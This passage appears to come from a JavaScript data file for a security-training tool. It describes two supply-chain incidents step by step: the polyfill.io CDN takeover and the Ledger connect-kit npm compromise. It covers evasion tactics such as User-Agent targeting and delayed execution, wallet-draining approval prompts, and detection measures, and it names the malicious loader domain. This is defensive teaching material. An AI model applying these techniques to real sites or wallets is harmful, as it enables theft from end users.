        'Following the ownership transfer of the cdn.polyfill.io domain (CVE-2024-38526), the CDN edge servers dynamically inject obfuscated JavaScript into mobile browsers across 100,000+ websites lacking Subresource Integrity (SRI).',
      storyAnalogy:
        'Imagine 100,000 retail stores hiring an outside translator who stands inside their checkout lane to help older customers read the signs. Years later, a syndicate buys the translator agency. Whenever a store manager looks, the translator behaves normally—but whenever a customer walks in on a mobile phone after hours, the translator slips a forged receipt into their bag.',
      plainSummary:
        'For years, web developers embedded `<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script>` to support older browsers. In February 2024, the `polyfill.io` domain was acquired by a third party (Funnull). By June 2024, Sansec discovered that `cdn.polyfill.io` was inspecting incoming HTTP headers and conditionally injecting obfuscated malware (`www.googie-anaiytics.com/gtags.js`) into mobile visitors while serving clean code to desktop admins.',
      diagramTopologySummary:
        'Rogue CDN Operator (cdn.polyfill.io) -> Enterprise Web Portal (<script src=...>) -> End-User Mobile Browser Session -> DOM Session Context & Redirect Target -> Sansec Scanner / Cloudflare Page Shield.',
      documentedAdvisory:
        'Sansec Polyfill.io Supply Chain Report / Cloudflare Automatic Rewrite Advisory / NVD CVE-2024-38526',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)',
        storyAnalogy:
          'A website leaves an open window in its checkout page that automatically runs whatever script is handed through by an external domain name.',
        simpleExplanation:
          'Over 100,000 websites embedded `<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script>` without a `Subresource Integrity (SRI)` hash (`integrity="sha384-..."`, a browser security attribute that verifies the cryptographic hash of a fetched script and refuses to execute it if a single byte changes), partially because `polyfill.io` was originally designed to return dynamic JS bundles tailored to each browser’s `User-Agent`.',
        howItWorksInPractice:
          'When ownership of the `polyfill.io` DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still referencing that `<script>` tag.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Rogue CDN Operator (`cdn.polyfill.io`) to the Enterprise Web Portal embedding the unverified `<script>` tag.',
        detectionAndEvidence:
          'Client-side script inventory scanners (Cloudflare Page Shield, Sansec) enumerating external `<script>` tags lacking `integrity` attributes or referencing deprecated domains.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1027',
        plainTitle: 'HTTP User-Agent Fingerprinting & Evasive Payload Generation',
        storyAnalogy:
          'The rogue server checks the visitor’s ID at the door: if it sees a security inspector or a desktop computer, it hands out a clean brochure; if it sees a mobile phone in a targeted region, it slips in a hidden detonator.',
        simpleExplanation:
          'The compromised `cdn.polyfill.io` server evaluated each request’s HTTP `User-Agent`, `Referer`, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile devices (`iPhone` / `Android` User-Agents) while returning benign polyfill code to desktop browsers, search engine crawlers, and pages containing admin analytics markers (`window.google_analytics_admin`, preventing site administrators from reproducing the infection during manual testing).',
        howItWorksInPractice:
          'The injected code also wrapped its execution in a `15-second setTimeout` delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Rogue CDN Operator to the End-User Mobile Browser Session and triggers the Sansec Scanner / Cloudflare Page Shield alert.',
        detectionAndEvidence:
          'Multi-User-Agent synthetic monitoring comparing script payloads returned for mobile vs. desktop headers over extended execution windows (>20 seconds).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1185',
        plainTitle: 'First-Party DOM Execution & Silent Session Hijack / Redirection',
        storyAnalogy:
          'Once the script runs inside the customer’s browser tab, it has the exact same authority as the store’s own checkout code.',
        simpleExplanation:
          'Because a `<script src="...">` tag executes directly inside the host page’s `Same-Origin Policy (SOP)` context (giving third-party scripts full read/write access to the page DOM, `localStorage`, non-HttpOnly `document.cookie` values, and `window.location`), the payload dynamically appended a secondary loader (`https://www.googie-anaiytics.com/gtags.js`) and hijacked mobile user sessions.',
        howItWorksInPractice:
          'To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap `cdn.polyfill.io` with a clean mirror at `cdnjs.cloudflare.com/polyfill`, and the domain registrar placed `polyfill.io` on `clientHold`.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the End-User Mobile Browser Session executing the payload inside the DOM Session Context & Redirect Target.',
        detectionAndEvidence:
          'Content-Security-Policy (`CSP`) violation telemetry alerting on unauthorized script loads from `www.googie-anaiytics.com` and removal of all `polyfill.io` references.',
      },
    ],
  },
  'ledger-connect-kit-npmjs-drainer': {
    scenarioId: 'ledger-connect-kit-npmjs-drainer',
    briefing: {
      headline:
        'An attacker compromises a former Ledger employee’s npmjs account and publishes malicious versions (1.1.5–1.1.7) of @ledgerhq/connect-kit, propagating the Angel Drainer payload to Web3 frontends via unpinned jsDelivr CDN URLs.',
      storyAnalogy:
        'Imagine a former bank courier who left the company a year ago, but nobody canceled their keycard to the central brochure rack. A scammer tricks the former courier into handing over the keycard, puts counterfeit deposit slips into the rack, and because hundreds of local branches automatically restock from the "latest" slot on the rack every hour, customers at those branches are handed forms that wire their funds to the scammer.',
      plainSummary:
        'In December 2023, a threat actor phished a former Ledger employee whose npmjs account still had publish rights to `@ledgerhq/connect-kit`. The attacker published versions `1.1.5`, `1.1.6`, and `1.1.7` containing the Angel Drainer wallet-draining script and a rogue WalletConnect project ID. Because `@ledgerhq/connect-kit-loader` fetched `https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1` without version pinning, hundreds of DeFi dApps immediately served the drainer to users.',
      diagramTopologySummary:
        'Angel Drainer Operator -> NPM & jsDelivr CDN (@ledgerhq/connect-kit) -> Downstream Web3 dApp Frontend -> User Web3 Wallet (Permit2 / SetApprovalForAll) -> Blockaid Web3 Runtime Scanner.',
      documentedAdvisory:
        'Ledger Post-Mortem on Connect Kit Incident / Blockaid Technical Analysis / Chainalysis & Checkmarx Advisory',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.001',
        plainTitle: 'Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7',
        storyAnalogy:
          'A former employee’s badge still works at the publishing house, allowing an impersonator to print three unauthorized editions without going through the editorial board.',
        simpleExplanation:
          'After spear-phishing a former employee whose npmjs account had not been removed from the `@ledgerhq` organization during offboarding, the attacker generated an npm access token and published `@ledgerhq/connect-kit` versions `1.1.5`, `1.1.6`, and `1.1.7` directly from the CLI (bypassing the official GitHub repository and CI/CD release pipeline entirely).',
        howItWorksInPractice:
          'Auditing the npm registry metadata against GitHub showed that versions `1.1.5–1.1.7` had no corresponding Git tags, pull requests, or GitHub Actions release runs in Ledger’s source repository.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Angel Drainer Operator to the NPM & jsDelivr CDN (`@ledgerhq/connect-kit`) as the unauthorized versions are published.',
        detectionAndEvidence:
          'Registry monitors (Socket / Checkmarx / Phylum) alerting when an npm package version is published without a matching GitHub tag or OIDC provenance attestation.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader',
        storyAnalogy:
          'Even stores that locked their own front doors had installed an automatic chute that pulled whatever package was labeled "Latest Version 1" straight from the public warehouse into their lobby.',
        simpleExplanation:
          'Even dApps that pinned their own `package-lock.json` were impacted because `@ledgerhq/connect-kit-loader` was designed to dynamically load `<script src="https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1/dist/umd/index.min.js">` at runtime in the user’s browser (using the floating major version tag `@1`, which caused jsDelivr’s CDN to automatically resolve and serve the newly published `1.1.7` bundle within minutes).',
        howItWorksInPractice:
          'This design bypassed build-time dependency pinning completely: every time a user loaded a dApp frontend in their browser, the browser fetched the latest `1.x` build directly from `cdn.jsdelivr.net`.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the NPM & jsDelivr CDN to the Downstream Web3 dApp Frontend and triggers the Blockaid Web3 Runtime Scanner.',
        detectionAndEvidence:
          'Frontend runtime monitoring (Blockaid) detecting unexpected script changes and newly injected WalletConnect Project IDs in live dApp DOMs.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1657',
        plainTitle: 'Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain',
        storyAnalogy:
          ' while the customer thinks they are simply signing in at the reception desk, the counterfeit screen asks them to sign a power-of-attorney form giving the thief permission to empty their vault.',
        simpleExplanation:
          'The injected `Angel Drainer` payload rendered a fake WalletConnect connection modal using an attacker-controlled WalletConnect Project ID, scanned the connected wallet’s token balances, and prompted the user to sign `EIP-712 Permit2` off-chain messages or `setApprovalForAll` transactions (cryptographic token allowances that grant the attacker’s drainer smart contract permission to transfer the user’s ERC-20 tokens and NFTs without further confirmation).',
        howItWorksInPractice:
          'Ledger hardware wallets themselves remained secure, but users who blindly approved the malicious transaction prompt on their wallet screen authorized the transfer; Ledger and WalletConnect contained the incident within hours by revoking the rogue WalletConnect Project ID, purging jsDelivr’s cache, and shipping pinned v1.1.8.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Downstream Web3 dApp Frontend prompting the User Web3 Wallet (`Permit2 / SetApprovalForAll`) to authorize the Angel Drainer operator.',
        detectionAndEvidence:
          'Wallet-level transaction simulation (Blockaid) flagging `eth_signTypedData_v4` (`Permit2`) and `setApprovalForAll` calls targeting known drainer spender addresses.',
      },
    ],
  },
};
